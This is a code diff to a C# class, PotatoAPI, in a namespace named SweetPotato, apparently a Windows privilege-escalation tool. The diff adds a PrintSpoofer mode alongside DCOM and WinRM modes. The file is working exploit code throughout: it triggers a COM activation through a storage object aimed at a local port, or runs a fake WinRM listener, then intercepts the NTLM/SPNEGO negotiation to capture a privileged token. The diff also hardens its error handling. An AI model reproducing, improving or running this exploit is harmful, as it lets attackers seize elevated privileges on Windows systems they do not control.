@@ -1,4 +1,5 @@
-﻿using System;
+﻿using rpc_12345678_1234_abcd_ef00_0123456789ab_1_0;
+using System;
 using System.Collections.Generic;
 using System.Net;
 using System.Net.Sockets;
@@ -14,34 +15,52 @@ namespace SweetPotato {
         User
     }
 
-    public class PotatoAPI {
+    internal class PotatoAPI {
 
         Thread comListener;
         Thread winRMListener;
+        PrintSpoofer printSpoofer;
         LocalNegotiator negotiator = new LocalNegotiator();
         Guid clsId;
         readonly int port;
-        bool fakeWinRM;
+        Mode mode;
         volatile bool dcomComplete = false;
 
+        public enum Mode {
+            DCOM,
+            WinRM,
+            PrintSpoofer
+        }
 
         public IntPtr Token {
             get {
-                return negotiator.Token;
+                if (mode == Mode.DCOM || mode == Mode.WinRM) {
+                    return negotiator.Token;
+                } else {
+                    return printSpoofer.Token;
+                }
             }
         }
 
         EventWaitHandle readyEvent = new EventWaitHandle(false, EventResetMode.AutoReset);
 
-        public PotatoAPI(Guid clsId, ushort port, bool fakeWinRM) {
+        public PotatoAPI(Guid clsId, ushort port, Mode mode) {
+
             this.clsId = clsId;
             this.port = port;
-            this.fakeWinRM = fakeWinRM;
+            this.mode = mode;
 
-            if (fakeWinRM)
-                StartWinRMThread();
-            else
-                StartCOMListenerThread();            
+            switch (mode) {
+                case Mode.DCOM:
+                    StartCOMListenerThread();
+                    break;
+                case Mode.WinRM:
+                    StartWinRMThread();
+                    break;
+                case Mode.PrintSpoofer:
+                    printSpoofer = new PrintSpoofer();
+                    break;
+            }                         
         }
 
         public Thread StartWinRMThread() {
@@ -58,7 +77,7 @@ namespace SweetPotato {
 
         string GetAuthorizationHeader(Socket socket) {
 
-            byte[] buffer = new byte[4096];
+            byte[] buffer = new byte[8192];
             int len = socket.Receive(buffer);
 
             string authRequest = Encoding.ASCII.GetString(buffer);
@@ -70,7 +89,7 @@ namespace SweetPotato {
                 return null;
             }
 
-            return matches[0].Groups["neg"].Value;
+            return matches[0].Groups["neg"].Value;           
         }
 
         void WinRMListener() {
@@ -91,10 +110,15 @@ namespace SweetPotato {
 
             string authHeader = GetAuthorizationHeader(clientSocket);
 
-            if (!negotiator.HandleType1(Convert.FromBase64String(authHeader))) { 
-                Console.Write("Failed to handle type SPNEGO");
-                clientSocket.Close();
-                listenSocket.Close();
+            try {
+                if (!negotiator.HandleType1(Convert.FromBase64String(authHeader))) {
+                    Console.Write("[!] Failed to handle type SPNEGO");
+                    clientSocket.Close();
+                    listenSocket.Close();
+                    return;
+                }
+            } catch (FormatException) {
+                Console.Write("[!] Failed to parse SPNEGO Base64 buffer");
                 return;
             }
                         
@@ -109,7 +133,11 @@ namespace SweetPotato {
             clientSocket.Send(Encoding.ASCII.GetBytes(challengeResponse));
             authHeader = GetAuthorizationHeader(clientSocket);
 
-            negotiator.HandleType3(Convert.FromBase64String(authHeader));
+            try {
+                negotiator.HandleType3(Convert.FromBase64String(authHeader));
+            } catch (FormatException) {
+                Console.WriteLine("[!] Failed to parse SPNEGO Auth packet");
+            }
 
             clientSocket.Close();
             listenSocket.Close();
@@ -181,34 +209,50 @@ namespace SweetPotato {
             }
         }
 
-        public bool TriggerDCOM() {
+        public bool Trigger() {
 
-            int result = 0;
+            bool result = false;
 
             try {
 
-                if (!fakeWinRM) {
-                    result = Ole32.CreateILockBytesOnHGlobal(IntPtr.Zero, true, out ILockBytes lockBytes);
-                    result = Ole32.StgCreateDocfileOnILockBytes(lockBytes, Ole32.STGM.CREATE | Ole32.STGM.READWRITE | Ole32.STGM.SHARE_EXCLUSIVE, 0, out IStorage storage);
-                    StorageTrigger storageTrigger = new StorageTrigger(storage, string.Format("127.0.0.1[{0}]", port), TowerProtocol.EPM_PROTOCOL_TCP);
+                switch (mode) {
 
-                    Ole32.MULTI_QI[] qis = new Ole32.MULTI_QI[1];
-                    qis[0].pIID = Ole32.IID_IUnknownPtr;
+                    case Mode.DCOM:
 
-                    result = Ole32.CoGetInstanceFromIStorage(null, ref clsId, null, Ole32.CLSCTX.CLSCTX_LOCAL_SERVER, storageTrigger, 1, qis);
-                } else {
+                        Ole32.CreateILockBytesOnHGlobal(IntPtr.Zero, true, out ILockBytes lockBytes);
+                        Ole32.StgCreateDocfileOnILockBytes(lockBytes, Ole32.STGM.CREATE | Ole32.STGM.READWRITE | Ole32.STGM.SHARE_EXCLUSIVE, 0, out IStorage storage);
+                        StorageTrigger storageTrigger = new StorageTrigger(storage, string.Format("127.0.0.1[{0}]", port), TowerProtocol.EPM_PROTOCOL_TCP);
 
-                    Type comType = Type.GetTypeFromCLSID(clsId);
-                    var instance = Activator.CreateInstance(comType);
+                        Ole32.MULTI_QI[] qis = new Ole32.MULTI_QI[1];
+                        qis[0].pIID = Ole32.IID_IUnknownPtr;
+
+                        Ole32.CoGetInstanceFromIStorage(null, ref clsId, null, Ole32.CLSCTX.CLSCTX_LOCAL_SERVER, storageTrigger, 1, qis);
+                        result = negotiator.Authenticated;
+                        break;
+
+                    case Mode.WinRM:
+
+                        Type comType = Type.GetTypeFromCLSID(clsId);
+                        var instance = Activator.CreateInstance(comType);
+                        result = negotiator.Authenticated;
+                        break;
+
+                    case Mode.PrintSpoofer:
+
+                        printSpoofer.TriggerPrintSpoofer();
+                        if(printSpoofer.Token != IntPtr.Zero) {
+                            result = true;
+                        }
+                        break;
                 }
-                 
+          
             } catch (Exception e) {
                 if (!negotiator.Authenticated)
                     Console.Write(String.Format("{0}\n", e.Message));
             }
 
             dcomComplete = true;
-            return negotiator.Authenticated;
+            return result;
         }
 
         int FindNTLMBytes(byte[] bytes) {
